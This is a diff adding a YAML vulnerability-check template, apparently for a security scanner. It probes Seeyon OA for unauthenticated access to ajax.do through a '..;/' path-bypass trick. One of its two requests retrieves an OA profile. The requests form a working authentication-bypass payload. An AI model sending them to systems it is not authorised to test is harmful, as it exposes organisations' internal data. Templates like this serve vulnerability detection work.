@@ -1,0 +1,16 @@
+name: poc-yaml-seeyon-ajax-unauthorized-access
+rules:
+  - method: GET
+    path: /seeyon/thirdpartyController.do.css/..;/ajax.do
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("java.lang.NullPointerException:null"))
+  - method: GET
+    path: /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("MMOneProfile")) && response.body.bcontains(bytes("productTags")) && response.body.bcontains(bytes("serverIdentifier")) && response.content_type.contains("application/json")
+
+detail:
+  author: x1n9Qi8
+  links:
+    - https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA
+    - https://buaq.net/go-53721.html
